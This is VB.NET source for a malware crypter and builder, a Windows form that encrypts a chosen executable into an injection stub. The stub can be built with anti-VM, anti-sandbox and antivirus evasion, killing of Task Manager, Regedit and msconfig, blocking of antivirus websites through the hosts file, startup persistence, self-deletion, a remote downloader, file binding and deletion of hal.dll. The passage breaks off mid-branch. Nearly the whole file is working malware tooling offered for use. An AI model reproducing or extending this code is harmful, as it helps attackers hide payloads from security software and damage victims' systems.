Imports System.IO
Imports System.Reflection

Public Class Form1
    Dim o, oo As New OpenFileDialog
    Private Sub MButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton1.Click
        o.DefaultExt = ""
        o.Filter = "Portable Executable Files (*.Exe)|*.Exe"
        o.FilterIndex = 1
        o.FileName = ""
        If o.ShowDialog(Me) = 1 Then
            TextBox1.Text = o.FileName
        End If
    End Sub
    Dim ResLoc As String = Application.StartupPath & "\A.Resources"
    Dim MyGuid As Guid
    Dim Stub As String = My.Resources.Stub
    Dim NewLine As String = Environment.NewLine
    Dim SFD As New SaveFileDialog
    Dim S As String
    Private Sub MButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton5.Click
        If TextBox1.Text = "Browse File to Protect..." Then
            MessageBox.Show("Please select a PE file to encrypt.", "Input", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        ElseIf TextBox3.Text = "Browse PE to Inject with..." Then
            MessageBox.Show("Please select a PE file to use for Injection.", "Input", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Exit Sub
        End If
        SFD.AddExtension = True
        SFD.Filter = "Executable Files (*.exe)|*.exe|Com Files (*.com)|*.com|Batch Files (*.bat)|*.bat|Program Information File (*.pif)|*.pif|Screen Saver Files (*.scr)|*.scr"
        If SFD.ShowDialog = Windows.Forms.DialogResult.OK Then
            S = SFD.FileName
        Else : Exit Sub
        End If
        Dim FileByte() As Byte = IO.File.ReadAllBytes(TextBox1.Text)
        Dim FileString As String = System.Text.Encoding.Default.GetString(FileByte)
        MyGuid = Guid.NewGuid()
        Dim EPass As String = MyGuid.ToString
        Dim BPass As Byte() = System.Text.Encoding.Default.GetBytes(EPass)
        Dim OutputByte As Byte() = Nothing
        Dim OutputString As String = Nothing
        Dim OutputBInj As Byte() = Nothing
        Dim OutputSInj As String = Nothing
        Dim ResByte As Byte() = IO.File.ReadAllBytes(TextBox3.Text)
        Dim ResString As String = System.Text.Encoding.Default.GetString(ResByte)
        Dim SName As String = TextBox4.Text
        Dim SNameB As Byte() = System.Text.Encoding.Default.GetBytes(SName)
        Dim OutName As String = Nothing
        Dim OutNameB As Byte() = Nothing
        Using A As New Resources.ResourceWriter(ResLoc)
            If RadioButton1.Checked = True Then
                'OutputByte = Encryption_Algorithms.Rc4(FileByte, BPass)
                'OutputBInj = Encryption_Algorithms.Rc4(ResByte, BPass)
                'OutNameB = Encryption_Algorithms.Rc4(SNameB, BPass)
                'A.AddResource("I", OutputBInj)
                'A.AddResource("F", OutputByte)
                'A.AddResource("NM", OutNameB)
                'A.AddResource("K", BPass)
                OutputString = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.Rc4(FileByte, BPass)))
                OutputSInj = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.Rc4(ResByte, BPass)))
                OutName = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.Rc4(SNameB, BPass)))
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", BPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.RC4)
                Stub = Stub.Replace("'LoadMethod", My.Resources.RC4Loader)

            ElseIf RadioButton4.Checked = True Then
                OutputString = Encryption_Algorithms.TripleDES(FileString, EPass, True)
                OutputSInj = Encryption_Algorithms.TripleDES(ResString, EPass, True)
                OutName = Encryption_Algorithms.TripleDES(SName, EPass, True)
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", EPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.TDESRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.TDESLoader)
            ElseIf RadioButton9.Checked = True Then
                OutputString = Encryption_Algorithms.Rijndael(FileString, EPass)
                OutputSInj = Encryption_Algorithms.Rijndael(ResString, EPass)
                OutName = Encryption_Algorithms.Rijndael(SName, EPass)
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", EPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.RijndaelRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.RijLoader)
            ElseIf RadioButton10.Checked = True Then
                OutputString = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.StairsEncryption.Crypt(FileByte, BPass)))
                OutputSInj = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.StairsEncryption.Crypt(ResByte, BPass)))
                OutName = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.StairsEncryption.Crypt(SNameB, BPass)))
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", BPass)
                'OutputByte = Encryption_Algorithms.StairsEncryption.Crypt(FileByte, BPass)
                'OutputBInj = Encryption_Algorithms.StairsEncryption.Crypt(ResByte, BPass)
                'OutNameB = Encryption_Algorithms.StairsEncryption.Crypt(SNameB, BPass)
                'A.AddResource("I", OutputBInj)
                'A.AddResource("F", OutputByte)
                'A.AddResource("NM", OutNameB)
                'A.AddResource("K", BPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.StairsRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.StairsLoader)
            ElseIf RadioButton17.Checked = True Then
                OutputString = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.AESEncrypt(FileByte)))
                OutputSInj = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.AESEncrypt(ResByte)))
                OutName = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.AESEncrypt(SNameB)))
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", BPass)
                'OutputByte = Encryption_Algorithms.AESEncrypt(FileByte)
                'OutputBInj = Encryption_Algorithms.AESEncrypt(ResByte)
                'OutNameB = Encryption_Algorithms.AESEncrypt(SNameB)
                'A.AddResource("I", OutputBInj)
                'A.AddResource("F", OutputByte)
                'A.AddResource("NM", OutNameB)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.AESRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.AESLoader)
            ElseIf RadioButton2.Checked = True Then
                OutputString = Encryption_Algorithms.xEncryption(EPass, FileString)
                OutputSInj = Encryption_Algorithms.xEncryption(EPass, ResString)
                OutName = Encryption_Algorithms.xEncryption(EPass, SName)
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", EPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.XORRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.XORLoader)
            ElseIf RadioButton3.Checked = True Then
                Dim P As New Encryption_Algorithms.PolyMorphic(EPass)
                OutputString = ReverseString(System.Text.Encoding.Default.GetString(P.PolyCrypt(FileByte)))
                OutputSInj = ReverseString(System.Text.Encoding.Default.GetString(P.PolyCrypt(ResByte)))
                OutName = ReverseString(System.Text.Encoding.Default.GetString(P.PolyCrypt(SNameB)))
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", EPass)
                'OutputByte = P.PolyCrypt(FileByte)
                'OutputBInj = P.PolyCrypt(ResByte)
                'OutNameB = P.PolyCrypt(SNameB)
                'A.AddResource("I", OutputBInj)
                'A.AddResource("F", OutputByte)
                'A.AddResource("NM", OutNameB)
                'A.AddResource("K", EPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.PolyXORRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.PolyXORLoader)
            ElseIf RadioButton24.Checked = True Then
                OutputString = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(FileByte, BPass)))
                OutputSInj = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(ResByte, BPass)))
                OutName = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(SNameB, BPass)))
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", BPass)
                'OutputByte = Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(FileByte, BPass)
                'OutputBInj = Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(ResByte, BPass)
                'OutNameB = Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(SNameB, BPass)
                'A.AddResource("I", OutputBInj)
                'A.AddResource("F", OutputByte)
                'A.AddResource("NM", OutNameB)
                'A.AddResource("K", BPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.PolyStairsRev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.PolyStairsLoader)
            ElseIf RadioButton21.Checked = True Then
                Dim P As New Encryption_Algorithms.PolyRC4(EPass)
                OutputString = P.Encrypt(FileString)
                OutputSInj = P.Encrypt(ResString)
                OutName = P.Encrypt(SName)
                A.AddResource("I", OutputSInj)
                A.AddResource("F", OutputString)
                A.AddResource("NM", OutName)
                A.AddResource("K", EPass)
                Stub = Stub.Replace("'InjectionEncryptionAlgorithm", My.Resources.PolyRC4Rev)
                Stub = Stub.Replace("'LoadMethod", My.Resources.PolyRC4Loader)
            End If
            If CheckBox68.Checked = True Then
                Dim xfile As Byte() = New Byte() {}
                My.Computer.FileSystem.WriteAllBytes(xpath, xfile, True)
                If RadioButton15.Checked = True Then
                    PumpFile(xpath, NumericUpDown6.Value)
                ElseIf RadioButton16.Checked = True Then
                    PumpFile(xpath, NumericUpDown7.Value * 1024)
                End If
                A.AddResource("Q", IO.File.ReadAllBytes(xpath))
                IO.File.Delete(xpath)
            End If
            If ListView1.Items.Count > 0 Then
                For Each item As ListViewItem In ListView1.Items
                    Dim itmTag As Byte() = IO.File.ReadAllBytes(item.Tag)
                    Dim Everything As String = System.Text.Encoding.Default.GetString(itmTag) + "@|C|@" + _
                    IO.Path.GetExtension(item.Tag)
                    Dim EncryptedS As String = Nothing
                    Dim EncryptedB As Byte() = Nothing
                    If RadioButton1.Checked = True Then
                        'EncryptedB = Encryption_Algorithms.Rc4(System.Text.Encoding.Default.GetBytes(Everything), BPass)
                        EncryptedS = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.Rc4(System.Text.Encoding.Default.GetBytes(Everything), BPass)))
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton4.Checked = True Then
                        EncryptedS = Encryption_Algorithms.TripleDES(Everything, EPass, True)
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton9.Checked = True Then
                        EncryptedS = Encryption_Algorithms.Rijndael(Everything, EPass)
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton10.Checked = True Then
                        'EncryptedB = Encryption_Algorithms.StairsEncryption.Crypt(System.Text.Encoding.Default.GetBytes(Everything), BPass)
                        EncryptedS = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.StairsEncryption.Crypt(System.Text.Encoding.Default.GetBytes(Everything), BPass)))
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton17.Checked = True Then
                        'EncryptedB = Encryption_Algorithms.AESEncrypt(System.Text.Encoding.Default.GetBytes(Everything))
                        EncryptedS = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.AESEncrypt(System.Text.Encoding.Default.GetBytes(Everything))))
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton2.Checked = True Then
                        EncryptedS = Encryption_Algorithms.xEncryption(EPass, Everything)
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton3.Checked = True Then
                        Dim xx As New Encryption_Algorithms.PolyMorphic(EPass)
                        'EncryptedB = xx.PolyCrypt(System.Text.Encoding.Default.GetBytes(Everything))
                        EncryptedS = ReverseString(System.Text.Encoding.Default.GetString(xx.PolyCrypt(System.Text.Encoding.Default.GetBytes(Everything))))
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton21.Checked = True Then
                        Dim xx As New Encryption_Algorithms.PolyRC4(EPass)
                        EncryptedS = xx.Encrypt(Everything)
                        A.AddResource("Ev", EncryptedS)
                    ElseIf RadioButton24.Checked = True Then
                        'EncryptedB = Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(System.Text.Encoding.Default.GetBytes(Everything), BPass)
                        EncryptedS = ReverseString(System.Text.Encoding.Default.GetString(Encryption_Algorithms.PolyMorphicStairs.PolyCrypt(System.Text.Encoding.Default.GetBytes(Everything), BPass)))
                        A.AddResource("Ev", EncryptedS)
                    End If
                Next
            End If
            If FileByte(60) = 128 Then
                A.AddResource("X", My.Resources.Invoke)
            Else
                A.AddResource("X", ReverseString(My.Resources.RpE))
            End If
            A.Generate()
        End Using
        Options()
 
        Compile(Stub, S, True, "Out", False, ResLoc)
        If TextBox2.Text = ooo.FileName Then
            IconChanger.InjectIcon(S, ooo.FileName)
        End If
        Dim Offset As String = "1"
        Dim OffsetSource() As Byte = System.Text.Encoding.Default.GetBytes(Offset)
        Using AntiAI As New FileStream(S, FileMode.Open, FileAccess.Write)
            AntiAI.Seek(4587, SeekOrigin.Begin)
            AntiAI.WriteByte(Offset)
            If CheckBox59.Checked = True Then
                AntiAI.Seek(244, SeekOrigin.Begin)
                AntiAI.WriteByte(11)
            End If
            AntiAI.Close()
        End Using

        If CheckBox27.Checked = True Then
            Dim EOF As String = Nothing
            EOF = ReadEOFData(o.FileName)
            IO.File.AppendAllText(S, EOF)
        End If
        Stub = My.Resources.ResetStub
        IO.File.Delete(ResLoc)
        MessageBox.Show("PE File Encrypted Successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
    Dim XTeaPass As New Random
    Public Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String
        Dim lPos As Integer
        If Dir(FilePath) = "" Then
            Exit Function
        End If
        Dim ReadFile As String = IO.File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        ReadEOFData = StrReverse(EOFBuf)
        If ReadEOFData = "" Then
        End If
        Exit Function
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function
    Dim tempicon As String = Application.StartupPath & "\Ticon.ico"
    Sub Options()
        If RadioButton18.Checked = True Then
            If RadioButton2.Checked = False Then
                Stub = Stub.Replace("'StubStrEncryption", My.Resources.XORRev)
            End If
        ElseIf RadioButton20.Checked = True Then
            If RadioButton9.Checked = False Then
                Stub = Stub.Replace("'StubStrEncryption", My.Resources.RijndaelRev)
            End If
        ElseIf RadioButton19.Checked = True Then
            If RadioButton4.Checked = False Then
                Stub = Stub.Replace("'StubStrEncryption", My.Resources.TDESRev)
            End If
        ElseIf RadioButton25.Checked = True Then
            Stub = Stub.Replace("'StubStrEncryption", My.Resources.PolyDec)
        End If
        If CheckBox72.Checked = True Then
            Stub = Stub.Replace("'AssemblyCodes", AssemblyChange)
        Else
            Stub = Stub.Replace("'AssemblyCodes", Nothing)
        End If
        If CheckBox71.Checked = True Then
            Stub = Stub.Replace("'Anti's Sub", My.Resources.AntisSub)
            Stub = Stub.Replace("'FunctionA", My.Resources.FunctionA)
            Stub = Stub.Replace("'CallAntis", "AT")
            Stub = Stub.Replace("'Killer Sub", My.Resources.Killers)
            Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            Stub = Stub.Replace("'KKK", "KKK")
            Stub = Stub.Replace("""SELECT * FROM Win32_VideoController""", EncryptString("SELECT * FROM Win32_VideoController"))
            Stub = Stub.Replace("""winmgmts:""", EncryptString("winmgmts:"))
            Stub = Stub.Replace("""\Sample.exe""", EncryptString("\Sample.exe"))
            Stub = Stub.Replace("""wireshark""", EncryptString("wireshark"))
            Stub = Stub.Replace("""VM Additions S3 Trio32/64""", EncryptString("VM Additions S3 Trio32/64"))
            Stub = Stub.Replace("""VirtualBox Graphics Adapter""", EncryptString("VirtualBox Graphics Adapter"))
            Stub = Stub.Replace("""SbieSvc""", EncryptString("SbieSvc"))
            Stub = Stub.Replace("""avp""", EncryptString("avp"))
            Stub = Stub.Replace("""VMware SVGA II""", EncryptString("VMware SVGA II"))
            Stub = Stub.Replace("""ashServ""", EncryptString("ashServ"))
            Stub = Stub.Replace("""avgtray""", EncryptString("avgtray"))
            Stub = Stub.Replace("""avgnt""", EncryptString("avgnt"))
            Stub = Stub.Replace("""76487-337-8429955-22614""", EncryptString("76487-337-8429955-22614"))
            Stub = Stub.Replace("""SOFTWARE\Microsoft\Windows NT\CurrentVersion""", _
                                    EncryptString("SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
            Stub = Stub.Replace("""ProductId""", EncryptString("ProductId"))
            Stub = Stub.Replace("""keyscrambler""", EncryptString("keyscrambler"))
            Stub = Stub.Replace("""bdagent""", EncryptString("bdagent"))
            Stub = Stub.Replace("""mbam""", EncryptString("mbam"))
            Stub = Stub.Replace("""panda""", EncryptString("panda"))
            Stub = Stub.Replace("""zlclient""", EncryptString("zlclient"))
            Stub = Stub.Replace("""ollydbg""", EncryptString("ollydbg"))
            Stub = Stub.Replace("""egui""", EncryptString("egui"))
            Stub = Stub.Replace("""hijackthis""", EncryptString("hijackthis"))
            Stub = Stub.Replace("""npfmsg""", EncryptString("npfmsg"))
            Stub = Stub.Replace("""SBAMsvc""", EncryptString("SBAMsvc"))
            Stub = Stub.Replace("""wine""", EncryptString("wine"))
            Stub = Stub.Replace("""outpost""", EncryptString("outpost"))
            Stub = Stub.Replace("""joeboxserver""", EncryptString("joeboxserver"))
            Stub = Stub.Replace("""joeboxcontrol""", EncryptString("joeboxcontrol"))
            'Else
            '    Stub = Stub.Replace("'Anti's Sub", Nothing)
            '    Stub = Stub.Replace("'FunctionA", Nothing)
            '    Stub = Stub.Replace("'CallAntis", Nothing)
            '    Stub = Stub.Replace("'Killer Sub", Nothing)
            '    Stub = Stub.Replace("'KillerFunction", Nothing)
            '    Stub = Stub.Replace("'KKK", Nothing)
        End If
        If CheckBox28.Checked = True Then
            Dim A2S As String = "Dim P2S As New Threading.Thread(AddressOf PushStart)" & Environment.NewLine & _
                Environment.NewLine & "P2S.Start()" & Environment.NewLine
            Stub = Stub.Replace("'Add2StartUp", My.Resources.Add2StartUp)
            Stub = Stub.Replace("'AStartUpCall", A2S)
            'Else
            '    Stub = Stub.Replace("'Add2StartUp", Nothing)
            '    Stub = Stub.Replace("'AStartUpCall", Nothing)
        End If
        If CheckBox1.Checked = True Then
            Dim MB As String = Nothing
            Dim MHold As String = Nothing
            If RadioButton26.Checked = True Then
                If RadioButton43.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & " , " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.OK, MessageBoxIcon.Error)"
                ElseIf RadioButton45.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.YesNo, MessageBoxIcon.Error)"
                ElseIf RadioButton46.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.OKCancel, MessageBoxIcon.Error)"
                ElseIf RadioButton47.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error)"
                End If
            ElseIf RadioButton28.Checked = True Then
                If RadioButton43.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.OK, MessageBoxIcon.Information)"
                ElseIf RadioButton45.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.YesNo, MessageBoxIcon.Information)"
                ElseIf RadioButton46.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.OKCancel, MessageBoxIcon.Information)"
                ElseIf RadioButton47.Checked Then
                    MB = "MessageBox.Show(" & Chr(34) & TextBox19.Text & Chr(34) & ", " & Chr(34) & TextBox9.Text & Chr(34) & ", MessageBoxButtons.RetryCancel, MessageBoxIcon.Information)"
                End If
            End If
            Stub = Stub.Replace("'MessageB", MB)
            'Else
            '    Stub = Stub.Replace("'MessageB", Nothing)
        End If
        If CheckBox74.Checked = True Then
            Stub = Stub.Replace("'Websites", My.Resources.Websites)
            Stub = Stub.Replace("'CallWS", "W")
            Stub = Stub.Replace("""www.novirusthanks.org""", EncryptString("www.novirusthanks.org"))
            Stub = Stub.Replace("""www.virustotal.com""", EncryptString("www.virustotal.com"))
            Stub = Stub.Replace("""www.virusscan.jotti.org""", EncryptString("www.virusscan.jotti.org"))
            Stub = Stub.Replace("""www.malwarebytes.org""", EncryptString("www.malwarebytes.org"))
            Stub = Stub.Replace("""www.bitdefender.com/scanner/online/free.html""", EncryptString("www.bitdefender.com/scanner/online/free.html"))
            Stub = Stub.Replace("""www.eset.com/online-scanner""", EncryptString("www.eset.com/online-scanner"))
            Stub = Stub.Replace("""housecall.trendmicro.com""", EncryptString("housecall.trendmicro.com"))
            Stub = Stub.Replace("""www.kaspersky.com/scanforvirus""", EncryptString("www.kaspersky.com/scanforvirus"))
            Stub = Stub.Replace("""www.kaspersky.com/virusscanner""", EncryptString("www.kaspersky.com/virusscanner"))
            Stub = Stub.Replace("""www.f-secure.com/en_EMEA/security/tools/online-scanner/""", EncryptString("www.f-secure.com/en_EMEA/security/tools/online-scanner/"))
            Stub = Stub.Replace("""www.windowsecurity.com/trojanscan""", EncryptString("www.windowsecurity.com/trojanscan"))
            Stub = Stub.Replace("""www.avg.com""", EncryptString("www.avg.com"))
            Stub = Stub.Replace("""www.avast.com""", EncryptString("www.avast.com"))
            Stub = Stub.Replace("""www.avira.com""", EncryptString("www.avira.com"))
            Stub = Stub.Replace("""www.zonealarm.com""", EncryptString("www.zonealarm.com"))
            Stub = Stub.Replace("""www.Symantec.com""", EncryptString("www.Symantec.com"))
            Stub = Stub.Replace("""security.symantec.com""", EncryptString("security.symantec.com"))
            Stub = Stub.Replace("""www.pandasecurity.com""", EncryptString("www.pandasecurity.com"))
            Stub = Stub.Replace("""\DNS.bat""", EncryptString("\DNS.bat"))
            Stub = Stub.Replace("""ipconfig/flushdns""", EncryptString("ipconfig/flushdns"))
            Stub = Stub.Replace("""ipconfig/release""", EncryptString("ipconfig/release"))
            Stub = Stub.Replace("""ipconfig/renew""", EncryptString("ipconfig/renew"))
            Stub = Stub.Replace("""\drivers\etc\hosts""", EncryptString("\drivers\etc\hosts"))
            'Else
            '    Stub = Stub.Replace("'Websites", Nothing)
            '    Stub = Stub.Replace("'CallWS", Nothing)
        End If
        If CheckBox50.Checked = True Then
            Stub = Stub.Replace("'TaskmanagerSub", My.Resources.TaskMSub)
            If Not CheckBox71.Checked = True Then
                Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            End If
            Dim TM As String = "Dim KF59 As New System.Threading.Thread(AddressOf F59)" & Environment.NewLine & _
            Environment.NewLine & "KF59.Start()" & Environment.NewLine & Environment.NewLine
            Stub = Stub.Replace("'TaskManagerK", TM)
            Stub = Stub.Replace("""taskmgr""", EncryptString("taskmgr"))
            'Else
            '    Stub = Stub.Replace("'TaskmanagerSub", Nothing)
            '    Stub = Stub.Replace("'TaskManagerK", Nothing)
        End If
        If CheckBox51.Checked = True Then
            Stub = Stub.Replace("'RegeditSub", My.Resources.Regedit)
            If Not CheckBox71.Checked = True Then
                Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            End If
            Dim RE As String = "Dim KF60 As New System.Threading.Thread(AddressOf F60)" & Environment.NewLine & _
            Environment.NewLine & "KF60.Start()" & Environment.NewLine & Environment.NewLine
            Stub = Stub.Replace("'RegeditK", RE)
            Stub = Stub.Replace("""regedit""", EncryptString("regedit"))
            'Else
            '    Stub = Stub.Replace("'RegeditK", Nothing)
            '    Stub = Stub.Replace("'RegeditSub", Nothing)
        End If
        If CheckBox52.Checked = True Then
            Stub = Stub.Replace("'msconfigSub", My.Resources.msconfig)
            If Not CheckBox71.Checked = True Then
                Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            End If
            Dim MS As String = "Dim KF61 As New System.Threading.Thread(AddressOf F61)" & Environment.NewLine & _
            Environment.NewLine & "KF61.Start()" & Environment.NewLine & Environment.NewLine
            Stub = Stub.Replace("'msconfigK", MS)
            Stub = Stub.Replace("""msconfig""", EncryptString("msconfig"))
            'Else
            '    Stub = Stub.Replace("'msconfigSub", Nothing)
            '    Stub = Stub.Replace("'msconfigK", Nothing)
        End If
        If CheckBox53.Checked = True Then
            Stub = Stub.Replace("'notepadSub", My.Resources.ANotePad)
            If Not CheckBox71.Checked = True Then
                Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            End If
            Dim AN As String = "Dim KF62 As New System.Threading.Thread(AddressOf F62)" & Environment.NewLine & _
            Environment.NewLine & "KF62.Start()" & Environment.NewLine & Environment.NewLine
            Stub = Stub.Replace("'notepadK", AN)
            Stub = Stub.Replace("""notepad""", EncryptString("notepad"))
            'Else
            '    Stub = Stub.Replace("'notepadK", Nothing)
            '    Stub = Stub.Replace("'notepadSub", Nothing)
        End If
        If CheckBox54.Checked = True Then
            Stub = Stub.Replace("'dxdiagSub", My.Resources.Adxdiag)
            If Not CheckBox71.Checked = True Then
                Stub = Stub.Replace("'KillerFunction", My.Resources.KFunction)
            End If
            Dim DX As String = "Dim KF63 As New System.Threading.Thread(AddressOf F63)" & Environment.NewLine & _
            Environment.NewLine & "KF63.Start()" & Environment.NewLine & Environment.NewLine
            Stub = Stub.Replace("'dxdiagK", DX)
            Stub = Stub.Replace("""dxdiag""", EncryptString("dxdiag"))
            'Else
            '    Stub = Stub.Replace("'dxdiagSub", Nothing)
            '    Stub = Stub.Replace("'dxdiagK", Nothing)
        End If
        If CheckBox55.Checked = True Then
            Stub = Stub.Replace("'FolderOpts", My.Resources.FolderOpt)
            Stub = Stub.Replace("""NoFolderOptions""", EncryptString("NoFolderOptions"))
            Stub = Stub.Replace("""HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer""", _
                                EncryptString("HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer"))
            'Else
            '    Stub = Stub.Replace("'FolderOpts", Nothing)
        End If
        If CheckBox56.Checked = True Then
            Stub = Stub.Replace("'meltSub", My.Resources.Melt)
            Stub = Stub.Replace("'meltcall", "Melt(IO.Path.GetFileName(Application.ExecutablePath))")
            Stub = Stub.Replace("""\Install.log""", EncryptString("\Install.log"))
            'Else
            '    Stub = Stub.Replace("'meltSub", Nothing)
            '    Stub = Stub.Replace("'meltcall", Nothing)
        End If
        If CheckBox60.Checked = True Then
            Stub = Stub.Replace("'restart", My.Resources.Restart)
            Stub = Stub.Replace("""\restart""", EncryptString("\restart"))
            Stub = Stub.Replace("""shutdown -r -t""", EncryptString("shutdown -r -t"))
            'Else
            '    Stub = Stub.Replace("'restart", Nothing)
        End If
        If CheckBox58.Checked = True Then
            Stub = Stub.Replace("'Downloader", My.Resources.Downloader)
            Stub = Stub.Replace("$DownloadLink$", EncryptString(TextBox8.Text))
            'Else
            '    Stub = Stub.Replace("'Downloader", Nothing)
        End If
        If NumericUpDown5.Value = 0 Then
            Stub = Stub.Replace("System.Threading.Thread.Sleep(DelayExe * 1000)", Nothing)
        Else
            Stub = Stub.Replace("DelayExe", NumericUpDown5.Value)
        End If
        If CheckBox61.Checked = True Then
            Stub = Stub.Replace("'delHALDLL", My.Resources.HalDLL)
            Stub = Stub.Replace("""\hal.dll""", EncryptString("\hal.dll"))
            'Else
            '    Stub = Stub.Replace("'delHALDLL", Nothing)
        End If
        If ListView1.Items.Count > 0 Then
            Stub = Stub.Replace("'Binder", My.Resources.Binder)
            Dim Binder As String = Nothing
            If RadioButton1.Checked = True Then
                Binder = "Dim FDC As String = System.Text.Encoding.Default.GetString(RC4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject(" & Chr(34) & "Ev" & _
                Chr(34) & "))), " & "R.GetObject(" & Chr(34) & "K" & Chr(34) & ")))" & NewLine & _
                "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton4.Checked = True Then
                Binder = "Dim FDC As String = TripleDESdecrypt(R.GetObject(" & Chr(34) & "Ev" & _
                Chr(34) & "), " & "R.GetObject(" & Chr(34) & "K" & Chr(34) & "), True)" & NewLine & _
                "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton9.Checked = True Then
                Binder = "Dim FDC As String = RijndaelDecrypt(R.GetObject(" & Chr(34) & "Ev" & _
                Chr(34) & "), " & "R.GetObject(" & Chr(34) & "K" & Chr(34) & "))" & NewLine & _
                "filled = Split(FDC, " & Chr(34) & "@|C|@" & Chr(34) & ")"
            ElseIf RadioButton10.Checked = True Then
